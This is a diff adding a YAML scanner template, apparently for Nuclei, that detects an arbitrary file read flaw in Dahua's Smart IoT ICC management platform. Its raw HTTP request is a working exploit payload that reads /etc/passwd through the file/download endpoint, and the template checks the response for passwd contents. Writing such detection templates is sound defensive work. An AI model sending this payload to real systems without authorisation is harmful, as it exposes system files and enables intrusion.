@@ -1,0 +1,29 @@
+id: dahua-arbitrary-file-read
+
+info:
+  name: Dahua Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The Dahua Smart IoT ICC Integrated Management Platform's evo-apigw/evo-cirs/file/download endpoint is vulnerable to arbitrary file read due to improper input validation.
+  tags: file-read,dahua,high
+
+http:
+  - raw:
+      - |
+        GET /evo-apigw/evo-cirs/file/download?filePath=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0:" # Verifies if the response contains typical /etc/passwd content.
+      - type: word
+        part: header
+        words:
+          - "text/plain" # Ensures the response content type is plain text.
